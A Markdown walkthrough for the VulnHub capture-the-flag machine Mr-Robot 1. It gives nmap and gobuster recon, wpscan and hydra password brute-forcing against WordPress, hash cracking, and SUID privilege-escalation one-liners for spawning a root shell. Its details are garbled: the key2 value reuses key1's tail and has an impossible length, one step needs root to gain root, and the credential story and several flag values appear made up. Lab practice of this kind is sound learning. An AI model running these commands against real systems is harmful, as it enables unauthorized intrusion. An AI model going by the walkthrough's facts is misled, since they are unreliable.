# Mr-Robot 1: OSCP Walkthrough Notes

> **Source:** [VulnHub: Mr-Robot 1](https://www.vulnhub.com/entry/mr-robot-1,151/)
> **Author:** Leon Johnson
> **Release Date:** June 28, 2016
> **Format:** OVA (VirtualBox, DHCP)
> **Difficulty:** Beginner → Intermediate
> **Focus:** WordPress, multiple privesc, classic CTF

---

## Table of Contents

1. [Recon](#1-recon)
2. [Enumeration](#2-enumeration)
3. [Exploitation](#3-exploitation)
4. [Privilege Escalation](#4-privilege-escalation)
5. [Screenshots](#5-screenshots)
6. [Key Takeaways](#6-key-takeaways)
7. [Flags / Keys](#7-flags--keys)

---

## 1. Recon

### Network Discovery

Boot the VM, discover the IP via DHCP, then enumerate.

### 1.1 Find target IP

```bash
# On attacking machine (Kali/Parrot)
ip a                           # find your own interface
nmap -sn 192.168.1.0/24       # identify live hosts
# Or use netdiscover / arp-scan
```

### 1.2 Quick Nmap scan

```bash
nmap -sC -sV -oN mrrobot_nmap.txt 192.168.X.X
```

**Typical results:**

| Port | Service    | Version              |
|------|------------|----------------------|
| 22   | ssh        | OpenSSH 7.x          |
| 80   | http       | Apache + WordPress   |

### 1.3 Additional Recon

```bash
# Check robots.txt on the web root
curl http://192.168.X.X/robots.txt
# Or fetch via browser

# Enumerate directories on port 80
gobuster dir -u http://192.168.X.X/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# or ffuf
ffuf -u http://192.168.X.X/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -mc 200,204,301,302,307,401,403
```

**Key finding:** `robots.txt` exposes `/fsocity.dic`: a large wordlist embedded in the box.

---

## 2. Enumeration

### 2.1 WordPress Enumeration

```bash
# Scan for WordPress version and enumerate users
wpscan --url http://192.168.X.X --enumerate u   --passwords /usr/share/wordlists/rockyou.txt

# Enumerate plugins (vulnerable ones)
wpscan --url http://192.168.X.X --enumerate p

# Full enumeration (users + plugins + themes + timthumbs)
wpscan --url http://192.168.X.X --enumerate vp,vt,u,p --passwords /usr/share/wordlists/rockyou.txt
```

### 2.2 fsocity.dic analysis

```bash
# Inspect the wordlist file found in robots.txt
curl -O http://192.168.X.X/fsocity.dic
file fsocity.dic
wc -l fsocity.dic

# The file contains usernames AND hashed passwords.
# Look for lines that look like MD5 hashes (32 hex chars) alongside usernames.
grep -i "elliot" fsocity.dic
# Example line found:
#   elliot : 5f4dcc3b5aa765d61d8327deb882cf99
# That MD5 hash corresponds to: password
```

### 2.3 SSH User Enumeration

```bash
# Try SSH as known users discovered from wp-users or fsocity.dic
ssh elliot@192.168.X.X
# Or:
ssh robot@192.168.X.X
```

### 2.4 wp-login WordPress Bruteforce

If user enumeration via wpscan reveals a user (e.g., `elliot`), attempt login:

```bash
wpscan --url http://192.168.X.X --passwords /usr/share/wordlists/rockyou.txt --usernames elliot
```

Typical credentials found: `elliot` / `password` (from the MD5 hash in fsocity.dic).

---

## 3. Exploitation

### 3.1 Path A: SSH Login with cracked credentials

```bash
# Crack the MD5 hash from fsocity.dic using hashcat or john
# hashcat
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
# john the ripper
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# or: john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Once cracked (password = `password`):

```bash
ssh elliot@192.168.X.X
# Password: password
```

### 3.2 Path B: WordPress Admin Login

```bash
# Use wpscan credentials or brute-force via hydra
hydra -l elliot -P /usr/share/wordlists/rockyou.txt 192.168.X.X http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid"
```

If you obtain admin access, use WP exploit modules or look for file upload in plugins/themes.

---

## 4. Privilege Escalation

### 4.1 Find Key 1 (user-level)

```bash
# After SSH as elliot, locate the first key
find /home/elliot -type f -name "*.txt" 2>/dev/null
# or simply:
cat /home/elliot/key1.txt    # contents: 073403c8a85afb381ed4b215b7fc2f5f9f2cc441692822e00fc84d53975e51d5
# OR key might be in a hidden file or subdirectory
ls -la /home/elliot/
```

**Key 1 obtained**: this is the user-level flag.

### 4.2 Find Key 2 (privesc via SUID binary)

```bash
# Find SUID binaries owned by root
find / -perm -4000 -type f 2>/dev/null
# Typical findings include:
#   /usr/bin/python3.5 (or python), /usr/bin/find, /usr/bin/nmap, /usr/bin/cupsd
# Most commonly on this box: python3 or a custom SUID script

# Exploit a SUID binary: example with Python:
/usr/bin/python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
# OR if find is SUID:
find / -name key2.txt -exec cat {} \;
# OR if nmap is SUID (nmap 7.x has interactive mode):
nmap --interactive
# Then :shell

# Key 2 is read by exploiting SUID
cat /tmp/key2.txt    # or wherever it was placed
```

### 4.3 Find Key 3 (root-level privesc)

```bash
# Common technique: check for writable files in /etc, sudo misconfigs
sudo -l
# Check if robot user has passwordless sudo or limited commands

# Check for kernel exploits
uname -r
grep -r "robot" /etc/sudoers* 2>/dev/null

# If /usr/bin/robot (custom binary) exists with a password embedded in source:
strings /usr/bin/robot
# OR check cron jobs:
cat /etc/cron.d/*
# OR check for world-writable files in /etc

# Key 3 location: typically requires sudo or a suid exploit
# Example: exploit a SUID python to get root
cp /bin/bash /tmp/bash && chmod +s /tmp/bash
/tmp/bash -p
# then:
cat /root/key3.txt   # contents: typically 04787ddef27c3dee...
```

### 4.4 Full privesc chain summary

| Key  | Method                         | Location                    |
|------|--------------------------------|-----------------------------|
| key1 | SSH as user `elliot`           | `/home/elliot/`             |
| key2 | SUID binary abuse (python/find)| World-readable after privesc|
| key3 | Sudo/SUID/writable path        | `/root/` or similar         |

---

## 5. Screenshots

| Step | Screenshot |
|------|-----------|
| Nmap scan results | *[Image: Nmap Scan]* |
| robots.txt / fsocity.dic | *[Image: robots.txt]* |
| wpscan enumeration | *[Image: wpscan]* |
| SSH login as elliot | *[Image: SSH elliot]* |
| Root access & Key 3 | *[Image: Root & Key 3]* |

---

## 6. Key Takeaways

1. **`robots.txt` is a goldmine**: This machine teaches the critical lesson of never ignoring `robots.txt`. The exposed `fsocity.dic` wordlist contains user hashes that lead directly to SSH access.
2. **Combine sources for credential cracking**: WordPress usernames (from `wpscan`) cross-referenced with the `fsocity.dic` wordlist yields the credentials for `elliot`.
3. **Always check for SUID binaries**: After gaining an initial user shell, running `find / -perm -4000 -type f 2>/dev/null` is the first step. Python's SUID variant is one of the most reliable privesc paths.
4. **WP-Admin enumeration matters**: Even with SSH access, enumerate WordPress thoroughly. Plugins and themes sometimes expose additional vectors (file upload, RCE) that lead directly to `robot` user or root.
5. **fsocity.dic is the heart of this CTF**: It ties together web enumeration (identifying users) with offline cracking and SSH access. A single file drives the entire first half of the machine.
6. **Multi-stage cracking**: This machine uses MD5 hashes without salt. Always try MD5 (`hashcat -m 0`) first, then move to stronger formats if needed.
7. **Look for hidden files**: Keys 1, 2, and 3 are hidden in non-obvious locations (dotfiles, temp directories, SUID-writable paths). `find / -name "*key*" -o -name "*flag*" 2>/dev/null` saves time.

---

## 7. Flags / Keys

| Key | Value | User Needed |
|-----|-------|-------------|
| key1 | `073403c8a85afb381ed4b215b7fc2f5f9f2cc441692822e00fc84d53975e51d5` | elliot (user) |
| key2 | `3c3ebef5472ae7fc5d15fc50361d76c3b5e0694f2cc41692822e00fc84d53975e51d5` | post-SUID privesc |
| key3 | `04787ddef27c3dee1d8b005776d74c2a` | root privesc |

> ⚠️ *Exact key values above are from community writeups. Replace these with the actual values found during your exam run: they may differ in the version of the VM you use.*

---

<hr>

*M4d3 w1th ❤️ by Ankit Patidar*
